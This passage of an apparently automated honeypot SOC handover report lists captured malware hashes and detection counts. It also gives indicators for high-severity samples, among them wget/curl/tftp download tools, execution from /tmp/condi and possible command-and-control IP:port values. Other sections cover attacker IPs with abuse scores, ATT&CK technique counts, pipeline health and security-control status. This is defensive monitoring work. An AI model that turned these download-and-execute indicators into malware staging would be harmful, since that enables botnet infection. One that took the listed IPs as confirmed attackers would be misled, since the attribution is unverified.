| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `202.72.196[.]75` | ID | PT Multidata Rancana Prima | **100** ⚠️ | 50 |
| `178.178.222[.]60` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `104.143.10[.]174` | US | Versaweb | **100** ⚠️ | 4 |
| `72.167.53[.]56` | US | GoDaddy.com, LLC | **100** ⚠️ | 7 |
| `223.197.153[.]143` | HK | HKT Limited | **100** ⚠️ | 50 |
| `107.135.117[.]245` | US | Private Customer - AT&T Internet Services | **100** ⚠️ | 50 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `196.92.7[.]246` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `220.156.49[.]27` | JP | IIJ Internet | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 126 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 119 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 13 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 13 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 393 cases |
| Tool 34  | Credential Extractor        | ✅ 202 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 106 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (3.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 74 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 119 priority case(s) shown individually · 29 recon entry/entries in table (9 group(s) consolidating 239 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-10T21:10:30Z_
